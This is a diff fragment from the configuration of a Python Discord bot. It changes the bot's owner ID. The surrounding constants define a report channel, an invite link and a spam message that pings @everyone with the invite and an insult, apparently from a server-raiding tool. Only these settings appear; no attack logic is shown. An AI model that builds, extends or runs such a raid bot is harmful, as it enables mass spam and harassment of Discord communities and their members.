@@ -43,7 +43,7 @@ client = commands.Bot(
 REPORT_CHANNEL_ID = 1516330515110559765
 INVITE_TEXT = "discord.gg/Gx9b3AsJR3"
 SPAM_MESSAGE = f"@everyone {INVITE_TEXT} owns ur server pussy"
-OWNER_ID = 1446215395358015559
+OWNER_ID = 1517964716264263834
 whitelisted_servers = set()
 
 # ============================================================
